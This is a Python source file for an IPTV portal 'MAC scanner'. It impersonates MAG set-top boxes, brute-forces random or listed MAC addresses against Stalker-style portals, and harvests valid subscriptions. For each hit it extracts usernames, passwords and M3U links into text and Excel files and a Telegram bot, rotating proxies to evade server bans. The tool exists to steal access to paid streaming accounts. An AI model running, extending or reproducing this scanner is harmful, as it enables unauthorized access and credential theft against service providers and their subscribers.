def m3uCheck(cid, user, pas, plink,ses):

    try:
        url = 'http' + "://" + plink + '/live/' + str(user) + '/' + str(pas) + '/' + str(cid) + '.ts'
        res = ses.get(url, headers=hea3(plink), timeout=(2, 5), allow_redirects=False, stream=True)
        if res.status_code == 302:
            return "OK"
        else:
            print("URL no existe:",url)
    except Exception as errp:
        #print("***!!!!***Error verificando m3u:",errp)
        return "KO"
    return "KO"

#valida la m3u si funciona
def m3uCheck_sinMAC(cid, user, pas, plink,ses):

    try:
        url = 'http' + "://" + plink + '/live/' + str(user) + '/' + str(pas) + '/' + str(cid) + '.ts'
        res = ses.get(url, headers=hea3(plink), timeout=(2, 5), allow_redirects=False, stream=True)
        if res.status_code == 302:
            return "OK"
        else:
            print("URL no existe:",url)
    except Exception as errp:
        #print("***!!!!***Error verificando m3u:",errp)
        return "KO"
    return "KO"

def hea1(macs, panel):
    HEADERA = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3",
        "Referer": "http://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }
    return HEADERA


def hea2(macs, panel, token):
    HEADERd = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3",
        "Referer": "http://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac=" + macs + "; stb_lang=es; timezone=Europe/Madrid;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": "Bearer " + token,
    }
    return HEADERd


def hea3(panel):
    hea = {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }
    return hea


def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr': 4,
        'may': 5,
        'jun': 6,
        'jul': 7,
        'aug': 8,
        'sep': 9,
        'oct': 10,
        'nov': 11,
        'dec': 12
    }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')


def dateAdjust(trh):
    month = str(trh.split(' ')[0])
    day = str(trh.split(', ')[0].split(' ')[1])
    year = str(trh.split(', ')[1])
    month = str(month_string_to_number(month))
    # print(ay)
    trai = str(day) + '/' + str(month) + '/' + str(year)
    my_date = str(trai)
    if 1 == 1:
        d = date(int(year), int(month), int(day))
        sontrh = time.mktime(d.timetuple())
        out = (int((sontrh - time.time()) / 86400))
        return out
    # except:pass


# create a randoMac number
def randommac():
    try:
        genmac = str(mactur) + "%02x:%02x:%02x" % (
            (random.randint(0, 256)), (random.randint(0, 256)), (random.randint(0, 256)))
    except:
        pass
    genmac = genmac.replace(':100', ':10')
    return genmac


# class that stores the paths for the output files
class OutpotHitsFiles:
    outputMainFile = ""
    salidaFiltro = ""
    salidaReducida = ""
    salidaHitsM3U=""
    ficheroExcel = ""
    ficheroCOMBOSHITS="/hits/hits_user_pass.txt"


    def __init__(self, panel: str, preMsg: str):
        # print("Creando datos del fichero de salida para:",panel)
        self.outputMainFile = rootDir + "/hits/full-" + preMsg + "@" + panel.replace(":", "_").replace('/', '') + ".txt"
        self.salidaFiltro = rootDir + "/hits/filter-" + preMsg + "@" + panel.replace(":", "_").replace('/',
                                                                                                       '') + ".txt"
        self.salidaReducida = rootDir + "/hits/mac-" + preMsg + "@" + panel.replace(":", "_").replace('/',
                                                                                                      '') + ".txt"
        self.ficheroExcel = rootDir + "/hits/excel-" + preMsg + "@" + panel.replace(":", "_").replace('/',
                                                                                                      '') + ".xlsx"
        self.salidaHitsM3U = rootDir + "/hits/m3u-" + preMsg + "@" + panel.replace(":", "_").replace('/',
                                                                                                  '') + ".txt"
        self.ficheroCOMBOSHITS = rootDir + self.ficheroCOMBOSHITS

    def __str__(self):
        return self.outputMainFile + "--" + self.salidaFiltro + "---" + self.salidaReducida + "--" + self.ficheroExcel

    # crea las rutas de los ficheros de salida para el panel invocado, solo las rutas, no los ficheros

    def crearRutasFicherosSalida(self, panel):
        self.outputMainFile = rootDir + "/hits/full-sps@" + panel.replace(":", "_").replace('/', '') + ".txt"
        self.salidaFiltro = rootDir + "/hits/filter-sps@" + panel.replace(":", "_").replace('/', '') + ".txt"
        self.salidaReducida = rootDir + "/hits/mac-sps@" + panel.replace(":", "_").replace('/', '') + ".txt"
        self.ficheroExcel = rootDir + "/hits/excel-sps@" + panel.replace(":", "_").replace('/', '') + ".xlsx"''
        self.salidaHitsM3U=rootDir + "/hits/m3u-sps@" + panel.replace(":", "_").replace('/', '') + ".txt"''
        self.ficheroCOMBOSHITS=rootDir + self.ficheroCOMBOSHITS


# Class that contains all the URL information to invoke the portal, it is created with the mac and the panel, depending on the type of  URL of the diferents servidce
class URLdeclare:
    url1 = ""
    url2 = ""
    url3 = ""
    url4 = ""
    url5 = ""
    url6 = ""
    liveusrl = ""
    vodurl = ""
    seriesurl = ""
    realblue = ""
    macs = ""
    panel = ""

    def __init__(self, panel, portalConcatString, macs):
        self.macs = macs
        self.panel = panel
        self.url1 = "http://" + panel + "/" + portalConcatString + "?type=stb&action=handshake&token&prehash=false&JsHttpRequest=1-xml"
        self.url2 = "http://" + panel + "/" + portalConcatString + "?type=stb&action=get_profile&JsHttpRequest=1-xml"
        if realblue == "real":
            self.url2 = "http://" + panel + "/" + portalConcatString + "?&action=get_profile&mac=" + self.macs + "&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22" + macs + "%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
        self.url3 = "http://" + panel + "/" + portalConcatString + "?type=account_info&action=get_main_info&JsHttpRequest=1-xml"

        self.url5 = "http://" + panel + "/" + portalConcatString + "?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

        self.url6 = "http://" + panel + "/" + portalConcatString + "?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

        # self.liveurl = "http://" + panel + "/" + portalConcatString + "?action=get_genres&type=itv&JsHttpRequest=1-xml&mac=" + self.macs
        self.liveurl = "http://" + panel + "/" + portalConcatString + "?action=get_genres&type=itv&p=1&mac=" + self.macs
        self.vodurl = "http://" + panel + "/" + portalConcatString + "?action=get_categories&type=vod&JsHttpRequest=1-xml"

        self.seriesurl = "http://" + panel + "/" + portalConcatString + "?action=get_categories&type=series&JsHttpRequest=1-xml&mac=" + self.macs

    def changeMac(self, newmac):
        self.macs = newmac


# check de hit remote ip
def vpnip(ip, miSession):
    urlGEOIP = "http://ip-api.com/json/" + ip  # remote service to extract info from ip
    vpnip = ""
    veri = ""
    try:
        res = miSession.get(urlGEOIP, timeout=7, verify=False)
        veri = str(res.text)
        if not '404 page' in veri:
            vpnips = veri.split('"country":"')[1]
            vpnc = veri.split('"city":"')[1].split('"')[0]
            vpn = vpnips.split('"')[0] + ' / ' + vpnc
        else:
            vpn = "Not Invalid"
    except:
        vpn = "Not Invalid"
    return vpn


# HIT screen output
def hitprint(mac, trh, portal):
    print('     🌟 🌟 🇭 🇮 🇹 🌟 🌟   \n  ' + str(mac) + '\n  ' + str(trh) + '\n  ' + str(portal))


# search for a string within another, we  used it to search for a country for example, ¿why not use string function? I cant remember....
def searchString(cadenasBusqueda, origen):
    # Search within source for any string within searchString
    encontradas = [x for x in cadenasBusqueda.upper().split() if origen.upper().find(x) >= 0]
    if (len(encontradas) > 0):
        return True
    else:
        return False


# -----------------------------------------------------------------------------------------------------------
# class to write HIT data to a Excel File
class ExcelOut:
    wb = Workbook
    excelCreated = False
    nombreFicheroSalida = ""

    def __init__(self, nombreSalida: str):
        self.nombreFicheroSalida = nombreSalida

    def createExcel(self, nombreFichero):
        self.nombreFicheroSalida = nombreFichero
        try:
            self.wb = load_workbook(nombreFichero)
        except:
            self.wb = Workbook()  # no existe lo creo de cero
            self.excelCreated = True
            ws = self.wb.create_sheet(index=0, title="hits")
            ws.oddHeader.center.text = "fffffffffffffffffff"
            ws.oddHeader.center.size = 14
            ws.oddHeader.center.font = "Tahoma,Bold"
            ws.oddHeader.center.color = "CC3366"
            ws.cell(row=1, column=1).fill = PatternFill(start_color='FFEE08', end_color='FFEE08', fill_type='solid')
            ws.cell(row=1, column=1).value = 'MAC'
            ws.cell(row=1, column=2).fill = PatternFill(start_color='FFEE08', end_color='FFEA08', fill_type='solid')
            ws.cell(row=1, column=2).value = 'URL'
            ws.cell(row=1, column=3).fill = PatternFill(start_color='FFEE08', end_color='FFEB08', fill_type='solid')
            ws.cell(row=1, column=3).value = 'M3U_URL'
            ws.cell(row=1, column=4).fill = PatternFill(start_color='FFEE08', end_color='FFEC08', fill_type='solid')
            ws.cell(row=1, column=4).value = 'USUARIO'
            ws.cell(row=1, column=5).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=5).value = 'PASSWORD'
            ws.cell(row=1, column=6).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=6).value = 'STATUS ACCOUNT'
            ws.cell(row=1, column=6).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=6).value = 'COUNTRY'
            ws.cell(row=1, column=6).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=6).value = 'CANALES'
            dim_holder = DimensionHolder(worksheet=ws)
            dim_holder[get_column_letter(1)] = ColumnDimension(ws, min=1, max=5, width=20)
            dim_holder[get_column_letter(2)] = ColumnDimension(ws, min=1, max=5, width=50)
            dim_holder[get_column_letter(3)] = ColumnDimension(ws, min=1, max=5, width=70)
            dim_holder[get_column_letter(4)] = ColumnDimension(ws, min=1, max=5, width=20)
            dim_holder[get_column_letter(5)] = ColumnDimension(ws, min=1, max=5, width=20)
            dim_holder[get_column_letter(6)] = ColumnDimension(ws, min=1, max=5, width=20)
            ws.column_dimensions = dim_holder
            self.wb.save(self.nombreFicheroSalida)

    # Escritura de los hits a fichero excel
    def writetoExcel(self, mihitData: HitData):
        if not self.excelCreated:
            self.createExcel(self.nombreFicheroSalida)
            self.excelCreated = True
        try:  # check if file exits
            ws = self.wb["hits"]
        except Exception as err:
            print("**********************Error writting excel:", err, "----Hoja:", self.datosSalida.ficheroExcel)
            # excel file doesn't find, we create it
        try:
            tempURL = "http://" + mihitData.panel + "/c/"  # cambiar esto para sacarlo de la clase
            rows = (mihitData.mac, tempURL, mihitData.m3uURL, mihitData.user, mihitData.password, mihitData.accountType,
                    mihitData.vpn, mihitData.livelist)
            ws.append(rows)
            self.wb.save(self.nombreFicheroSalida)
        except Exception as err:
            print("Error writting to excel file:", err)


class ScannerProxies:
    SOCKS5 = 1
    SOCKS4 = 2
    HTTP = 3
    IPVANISH = 4
    proxiesFile: str
    proxiesList: []
    totalProxies = 0
    lastGivenProxy = 0
    httpProxy = "http:socks5"
    httsProxyType = ""
    proxyType = 0  # sockk5,http,https, ipVanish
    StartedTime = time.time()

    def __init__(self, _proxiesFile, _proxyType):
        self.proxiesFile = _proxiesFile
        self.proxyType = _proxyType

    # Load all proxies from a file, convert each line into a set of attributes proxy which are valid for a session object
    def loadProxiesFromFile(self):
        openproxyfile = open(self.proxiesFile, "r")
        self.proxiesList = openproxyfile.readlines()
        self.totalProxies = (len(self.proxiesList) - 1)  # the list began in 0
        # eliminate chars invalid
        host = ""
        for i in range(0, self.totalProxies):
            try:
                if ((self.proxyType == ScannerProxies.IPVANISH) or (self.proxyType == ScannerProxies.SOCKS5)):
                    self.proxiesList[i] = self.proxiesList[i].replace('\n', '')
                    host = self.proxiesList[i].split(':')[0].replace(' ', '')  # ""
                    port = self.proxiesList[i].split(':')[1].replace(' ', '')  # ""
                    proxies = {'http': 'socks5://' + host + ':' + port, 'https': 'socks5://' + host + ':' + port}
                    if (self.proxyType == ScannerProxies.IPVANISH):
                        user = self.proxiesList[i].split(':')[2].replace(' ', '')
                        passw = self.proxiesList[i].split(':')[3].replace(' ', '')
                        proxies = {'http': 'socks5://' + user.replace(' ', '') + ':' + passw + '@' + host + ':' + port,
                                   'https': 'socks5://' + user + ':' + passw + '@' + host + ':' + port}
                else:
                    if (self.proxyType == ScannerProxies.SOCKS4):
                        self.proxiesList[i] = self.proxiesList[i].replace('\n', '')
                        host = self.proxiesList[i].split(':')[0].replace(' ', '')
                        port = self.proxiesList[i].split(':')[1].replace(' ', '')
                        proxies = {'http': 'socks4://' + host + ':' + port, 'https': 'socks4://' + host + ':' + port}
                    else:
                        if (self.proxyType == ScannerProxies.HTTP):
                            self.proxiesList[i] = self.proxiesList[i].replace('\n', '')
                            host = self.proxiesList[i].split(':')[0].replace(' ', '')
                            port = self.proxiesList[i].split(':')[1].replace(' ', '')
                            proxies = {'http': 'http://' + host + ':' + port,
                                       'https': 'http://' + host + ':' + port}
                self.proxiesList[i] = proxies
            except Exception as err:
                if (i != ''):
                    self.proxiesList.remove(self.proxiesList[i])  # delete proxy with transalte error

    def __str__(self):
        return str(self.proxiesList)

    # return attribute proxy that is valid for a session object
    def getProxy(self):
        proxySelected = self.lastGivenProxy % self.totalProxies
        self.lastGivenProxy += 1
        return self.proxiesList[proxySelected]


# main class to search HITs into a portal, this class can start multiThreads

class PortalScanner:
    hitc = 0
    htir = 0
    tokenr = ""
    total = ""
    cpm = 0
    panel = ""
    datosSalida: OutpotHitsFiles
    # portal = ""
    hityaz = 0
    totalHilos = 0
    listaMac = ""
    hitr = "\33[1;33m"
    cpm = 0
    cpmx = 0
    excelWriter: ExcelOut
    useProxies = False
    miScannerProxies: ScannerProxies
    jumpMacs = 0
    lock = threading.Lock()
    contador = 0
    TiempoInicio = 0
    initialMacPosition = 0  # guardo los saltos que se producen de mac al empezar, para calcular bien los CPM
    miBot : BotSenderData


    def __str__(self):
        return str(self.hitc) + "---" + str(self.htir) + "---" + str(tokenr) + "---" + str(self.total) + "---" + str(
            self.cpm) + "---Panels class PortalScanner:" + self.panel + "---" + str(self.datosSalida) + "---" + str(
            self.hityaz) + "---" + str(self.totalHilos) + "---" + self.listaMac + "---" + str(self.cpmx)

    def __init__(self, portalName, datosFicherosSalida, totalHilos, excelW: ExcelOut, useProxy,
                 _scannerProxies: ScannerProxies, jumpMacs):
        self.totalHilos = portalName
        self.datosSalida = datosFicherosSalida
        self.totalHilos = totalHilos
        self.hitc = 0
        self.panel = portalName
        self.excelWriter = excelW
        self.useProxies = useProxy
        self.miScannerProxies = _scannerProxies
        self.jumpMacs = int(jumpMacs)
        self.initialMacPosition = int(jumpMacs)
        self.miBot= BotSenderData()
        self.miBot.loadBOTData()

    # tratamos el hit encontrado para mandar a las salidas definidas
    def hit(self, miHit: HitData):
        try:
            self.hitRecorder(miHit)
            self.hityaz = self.hityaz + 1
            # print(miHit) #borro la salida por pantalla para acelerar todo
            if self.hityaz >= self.hitc:
                hitr = "\33[1;33m"
        except Exception as err:
            print("Error writting hit:", str(miHit))

    # check if the acoount can access to the service
    def checkAccountType(self, link, miSesion, panel):
        try:
            res = miSesion.get(link, headers=hea3(panel), timeout=(2, 5), allow_redirects=False, stream=True)
            msg = "🆅🅿🅽 🔒🔒 "  # This only test if we arrive to an URL thats plays a video
            if res.status_code == 302:  # the account is ok
                msg = "🆅🅿🅽 ✅😎 "
        except Exception as err:
            msg = "🆅🅿🅽 🔒🔒 "
        return msg

    # Write hit data to output files
    def hitRecorder(self, mihit: HitData):
        try:
            outputFile = open(self.datosSalida.outputMainFile, 'a+', encoding="utf8")
            outputFile.write(str(mihit))
            outputFile.close()
            if (aplicarFiltro):
                if (searchString(patronFiltroPais, str(mihit))):  # Esto busca en todo el hit  una cadena
                    # if (buscarCadena(patronFiltroPais,mihit.timezone)):
                    fichero_salidaFiltro = open(self.datosSalida.salidaFiltro, 'a+', encoding="utf8")
                    fichero_salidaFiltro.write(str(mihit))
                    fichero_salidaFiltro.close()
            # writing hit data, only mac info is writed to this file
            fichero_salidaFiltro = open(self.datosSalida.salidaReducida, 'a+', encoding="utf8")
            fichero_salidaFiltro.write(mihit.mac + "\n")
            fichero_salidaFiltro.close()
            if (mihit.m3uValid.find("ONLINE")>=0):
                #la m3u es valida, creo el fichero especial para ella
                outputFile = open(self.datosSalida.salidaHitsM3U, 'a+', encoding="utf8")
                outputFile.write(str(mihit.m3uURL)+"\n")
                outputFile.close()
                outputFile = open(self.datosSalida.ficheroCOMBOSHITS, 'a+', encoding="utf8")
                outputFile.write(str(mihit.user+":"+mihit.password) + "\n")
                outputFile.close()

            # writing to excel file hit data
            self.excelWriter.writetoExcel(mihit)
            # send message to telegram bot
            if self.miBot.doTelegramBot:
                self.miBot.sendMessage(mihit.getSortOutput())
        except Exception as err:
            print("Error writing to file:", err,
                  "--------------------------------------------------------------------------------------------")

    #metodo para crear la informacion del dispositivo
    def createSerialInfoFromMAC(self,datos:HitData):
        try:
            SN = (hashlib.md5(datos.mac.encode('utf-8')).hexdigest())
            datos.serial = SN.upper()
            datos.shortSerial = datos.serial[:13]
            DEV = hashlib.sha256(datos.mac.encode('utf-8')).hexdigest()
            datos.deviceID1 = DEV.upper()
            SG = datos.shortSerial + '+' + (datos.mac)
            SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
            datos.deviceID2 = SING.upper()
        except:
            False

    def list(self, listlink, macs, token, livel, miSession):
        categoria = ""
        veri = ""
        intento = 0
        while True:
            try:
                res = miSession.get(listlink, headers=hea2(macs, self.panel, token), timeout=15, verify=False)
                veri = str(res.text)
                break
            except:
                intento = intento + 1
                # time.sleep(1) esto lo ignoro, no merece la pena esperar para sacar la lista de canales
                # if intento == 12:
                break
        # si existen varios datos de canales, creo una lista
        canal = ""
        if veri.count('title":"') > 1:
            for i in veri.split('title":"'):
                try:
                    canal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/', '/')
                except:
                    canal = ""
                categoria = categoria + canal + livel
        list = categoria
        return list

    # Funcion para extraer la url m3u del portal, asi como la informacion de conexiones activas
    def m3uapi(self, playerlink, macs, token, miHit: HitData, miSession):
        mt = ""
        intento = 0
        message = ""
        bitism = ""
        mcon = ""
        userm = ""
        timezone = ""
        port = ""
        veri = ""
        acon = ""
        status = ""
        bitism = ""

        while True:
            try:
                res = miSession.get(playerlink, headers=hea2(macs, self.panel, token), timeout=7, verify=False)
                veri = ""
                veri = str(res.text)
                if (veri.count("503 Service") == 0):
                    break
                else:
                    raise Exception("503 Service Temporarily Unavailable")
                # print("m3uapi---->playerlink--->",playerlink,"---->panel:",self.panel,"---->token:",token)
                # print("m3uapi---->Respuesta:m3uApi--->",veri)
            except:
                time.sleep(1)
                intento = intento + 1
                if intento == 6:
                    break
        try:
            if 'active_cons' in veri:
                acon = veri.split('active_cons":')[1]
                acon = acon.split(',')[0]
                acon = acon.replace('"', "")

                mcon = veri.split('max_connections":')[1]
                mcon = mcon.split(',')[0]
                mcon = mcon.replace('"', "")

                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")

                timezone = veri.split('timezone":"')[1]
                timezone = timezone.split('",')[0]
                timezone = timezone.replace("\/", "/")

                realm = veri.split('url":')[1]
                realm = realm.split(',')[0]
                realm = realm.replace('"', "")

                port = veri.split('port":')[1]
                port = port.split(',')[0]
                port = port.replace('"', "")

                userm = veri.split('username":')[1]
                userm = userm.split(',')[0]
                userm = userm.replace('"', "")

                pasm = veri.split('password":')[1]
                pasm = pasm.split(',')[0]
                pasm = pasm.replace('"', "")

                bitism = veri.split('exp_date":')[1]
                bitism = bitism.split(',')[0]
                bitism = bitism.replace('"', "")
                try:
                    message = veri.split('message":"')[1].split(',')[0].replace('"', '')
                except:
                    False
                if bitism == "null":
                    bitism = "Unlimited"
                else:
                    bitism = (datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
            miHit.mensaje = str(message)
            miHit.caducidad = bitism
            miHit.conexionesActivas = acon
            miHit.maxConexiones = mcon
            miHit.nickUser = str(nickn)
            miHit.playerlink = playerlink
            miHit.panel = """http://""" + self.panel + """/c/"""
            miHit.user = userm
            miHit.port = port
            miHit.timezone = timezone
        except Exception as error:
            print("Error creando m3uapi:", error,
                  "---------------------------------------------------------------------")
            pass

    def outputScreenData(self, mac, bot, total, hitc, media, tokenr):
        cpmx = 0
        try:
            self.cpmx = (time.time() - self.cpm)
            self.cpmx = (round(60 / self.cpmx))
            # cpm=cpmx
            if str(self.cpmx) == "0":
                self.cpm = self.cpm
            else:
                self.cpm = self.cpmx
            echo = ("""
    ╭─➤ 🔥☛⫷	🅀🅄🄴 🄽🄾 🄵🄰🅁🅃🄴 🄳🄴 🄽🄰🄰🄰🄰🄰  ⫸☚🔥             
    ├● MacLink """+Back.WHITE+Fore.BLACK+""" ➤ """ + str(self.panel) + Back.RESET+Fore.RESET+"""   
    ├─● """ + tokenr + str(mac) + Fore.GREEN+""" CPM➤""" + str(self.cpm) +Fore.RESET+Fore.BLUE + """ """ + str(bot) + Fore.MAGENTA+""" Total➤""" + str(total) + Fore.RESET+""" 
    ╰─➤"""+ Fore.YELLOW+str(self.hitr) + """ Hit➤""" + str(hitc) +Fore.RED+"""   %""" + str(media) + Fore.RESET)
            print(echo)
            self.cpm = time.time()
        except Exception as verr:
            print("Error convertiendo fechas:", verr)
            pass

    # Proceso de scaneo en busca de hits
    def doScan(self, datosFicherosSalida: OutpotHitsFiles, numeroBot: int, miSession, miProxy: ScannerProxies,apiMode,listaMacs):
        if apiMode:
            self.jumpMacs=0 #reiniciamos los valores en modo api
            posicionMac=-1
        actualProxie = ""
        pattern = "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
        veri = ""
        conexionErronea = False
        # macFirst=numeroBot+self.jumpMacs
        funcionar = True
        # for mac in range(macFirst, totalMacs, botsay):
        # self.contador=int(self.jumpMacs)
        posicionMac=-1
        while (funcionar) and (posicionMac+1<len(listaMacs)):
            if (conexionErronea == True): break
            try:
                # -------------------------------------------------------------------!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                self.lock.acquire()
                posicionMac = self.jumpMacs  # invocacion sincronizada
                self.jumpMacs += 1
                self.lock.release()
                # -------------------------------------------------------------------!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
            except Exception as vErr:
                funcionar = False
                print("Error---->" + vErr)
                self.lock.release()
                break  # error cogiendo mac/fin de lista de macs
            if (not apiMode) and (tipoMac == "0"):
                mac = randommac()
            else:
                try:
                    macv = re.search(pattern, listaMacs[posicionMac],
                                 re.IGNORECASE)  # lista macs es un objeto compartido por todos los hilos, solo cambia la posición que se lee
                except Exception as errp:
                    print("****************Error leyendo mac pos:",posicionMac,"---",errp)
                    funcionar=False
                    mac="00:00:00:00:00"
                if funcionar and macv:
                    mac = macv.group()
                else:
                    continue
            macs = mac.upper().replace(':', '%3A')
            miUrlDeclase = URLdeclare(self.panel, portalConcatString, mac)
            bot = "Bot_" + str(numeroBot)
            #media = ""
            #media = round(((posicionMac) / (totalMacs) * 100), 2)  # revisar esta formula, para multitheds esta mal
            #self.outputScreenData(mac, bot, posicionMac, self.hitc, media, self.tokenr)
            intento = 0
            miUrlDeclase.changeMac(macs)  # update  URLs  with a new mac
            if (self.useProxies):
                actualProxie = miProxy.getProxy()
                miSession.proxies.update(actualProxie)  # change proxy setting each invoking
            while True:
                try:
                    miHeader = hea1(macs, self.panel)
                    res = miSession.get(miUrlDeclase.url1, headers=miHeader, timeout=15, verify=False)
                    veri = str(res.text)  # token extraction
                    # print("-------1-------", veri)
                    if (veri.count('503 Service') == 0):
                        break
                    else:
                        raise Exception("503 Service Temporarily Unavailable")
                except Exception as err:  # waiting for a possible BAN from server or IP not reacheabled, after 12 tries, the thread stop working
                    print("---Connection Error to portal--try-" + str(intento) + "--------Bot:" + str(
                        numeroBot) + "---proxy:" + str(actualProxie) + "---------><", err,"\n",miUrlDeclase.url1)
                    if (self.useProxies):  # change proxy, maybe the proxy is down
                        actualProxie = miProxy.getProxy()
                        miSession.proxies.update(actualProxie)  # chande proxy setting each invoking
                    intento = intento + 1
                    # time.sleep(1)
                    if ((intento >= 0) and not (self.useProxies)):
                        conexionErronea = True
                        break
            tokenr = "\33[35m"
            if 'token' in veri:  # esta la palabra token dentro de la invocacion, puedo seguir con el proceso
                tokenr = "\33[0m"
                token = veri.replace('{"js":{"token":"', "")
                token = token.split('"')[0]
                token = re.sub("\\r|\\n|\}", "", token)  # eliminate invalid chars
                intento = 0
                while True:
                    try:
                        miHeader = hea2(macs, self.panel, token)
                        res = miSession.get(miUrlDeclase.url2, headers=miHeader, timeout=15, verify=False)
                        # print("-------2-------", miHeader)
                        veri = ""
                        veri = str(res.text)
                        if (veri.count('503 Service') == 0):
                            # print("-------2-------", veri)
                            break
                        else:
                            raise Exception("503 Service Temporarily Unavailable")
                    except Exception as err:
                        intento = intento + 1
                        # time.sleep(1)
                        if ((intento >= 1) and not (self.useProxies)):
                            conexionErronea = True
                            break
                id = "null"
                ip = ""
                try:
                    id = veri.split('{"js":{"id":')[1]
                    id = id.split(',"name')[0]
                    ip = veri.split('ip":"')[1]
                    ip = ip.split('"')[0]
                except:
                    pass
                if not id == "null":
                    intento = 0
                    while True:
                        try:
                            miHeader = hea2(macs, self.panel, token)
                            res = miSession.get(miUrlDeclase.url3, headers=miHeader, timeout=15, verify=False)
                            veri = ""
                            veri = str(res.text)
                            if (veri.count('503 Service') == 0):  # el servicio esta caido por muchos intentos
                                break
                            else:
                                raise Exception("503 Service Temporarily Unavailable")
                        except:
                            intento = intento + 1
                            # time.sleep(1)
                            if ((intento >= 1) and not (self.useProxies)):
                                conexionErronea = True
                                break
                    if not veri.count(
                            'phone') == 0:  # fecha caducidad de la lista, solo valido estas ¿y las indefinidas?
                        self.hitr = "\33[1;36m"
                        self.hitc = self.hitc + 1
                        lastDate = ""
                        if 'end_date' in veri:
                            lastDate = veri.split('end_date":"')[1]
                            lastDate = lastDate.split('"')[0]
                        else:
                            try:
                                lastDate = veri.split('phone":"')[1]
                                lastDate = lastDate.split('"')[0]
                                if lastDate.lower()[:2] == 'un':
                                    tiempoRestante = (" Days")
                                else:
                                    tiempoRestante = (str(dateAdjust(lastDate)) + " Days")
                                    lastDate = lastDate + ' ' + tiempoRestante
                            except:
                                pass
                        # hitprint(mac, lastDate, self.panel) #Elimino una salida por pantalla
                        intento = 0
                        while True:
                            try:
                                miHeader = hea2(macs, self.panel, token)
                                res = miSession.get(miUrlDeclase.url6, headers=miHeader, timeout=10, verify=False)
                                # print("------4--------", miHeader)
                                veri = ""
                                veri = str(res.text)
                                if (veri.count('503 Service') == 0):  # el servicio esta caido por muchos intentos
                                    cid = ""
                                    if (veri != ""):
                                        cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                                    break
                                else:
                                    raise Exception("503 Service Temporarily Unavailable")
                            except:
                                intento = intento + 1
                                # time.sleep(1)
                                if intento == 10:
                                    # quit()
                                    conexionErronea = True
                                    cid = "94067"
                                    break
                        real = self.panel
                        m3ulink = ""
                        user = ""
                        pas = ""
                        accountType = "Invalid Opps"
                        intento = 0
                        serieslist = ""
                        while True:
                            try:
                                miHeader = hea2(macs, self.panel, token)
                                res = miSession.get(url(cid, self.panel, portalConcatString, macs), headers=miHeader,
                                                    timeout=15,
                                                    verify=False)
                                # print("------5--------", miHeader)
                                veri = ""
                                veri = str(res.text)
                                if (veri.count('503 Service') == 0):  # el servicio esta caido por muchos intentos
                                    link = veri.split('ffmpeg ')[1].split('"')[0].replace('\/', '/')
                                    real = 'http://' + link.split('://')[1].split('/')[0] + '/c/'
                                    user = str(link.replace('live/', '').split('/')[3])
                                    pas = str(link.replace('live/', '').split('/')[4])
                                    m3ulink = 'http://' + self.panel.replace('/c/', '') + "/get.php?username=" + str(
                                        user) + "&password=" + str(pas) + "&type=m3u_plus"
                                    accountType = self.checkAccountType(link, miSession, self.panel)
                                    break
                                else:
                                    raise Exception("503 Service Temporarily Unavailable")
                            except Exception as err:
                                # print("Error reading CID data:", err, " Hilo:", threading.Thread.native_id, "--BOT:", numeroBot, " del Panel:", self.panel + " Objeto:" + str(self))
                                # print("-------6-------")
                                if (self.useProxies):  # change proxy, maybe the proxy is down
                                    actualProxie = miProxy.getProxy()
                                    miSession.proxies.update(actualProxie)  # chande proxy setting each invoking
                                intento = intento + 1
                                # time.sleep(1)
                                if ((intento >= 1) and not (self.useProxies)):
                                    #conexionErronea = True #no tiro el ataque al server, poruqe solo no funciona la url de m3u
                                    break
